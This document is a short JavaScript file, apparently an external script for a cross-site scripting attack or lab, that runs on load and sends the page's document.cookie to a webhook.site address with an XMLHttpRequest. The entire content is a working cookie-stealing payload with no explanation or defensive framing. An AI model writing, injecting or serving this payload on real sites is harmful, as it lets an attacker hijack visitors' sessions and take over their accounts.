function sendMessage() {
	var request = new XMLHttpRequest();
	request.open("GET", "http://webhook.site/13d865ce-b9f2-4fb1-b05a-021c75169ce7?script=external&"+document.cookie);
	request.send();
}
sendMessage()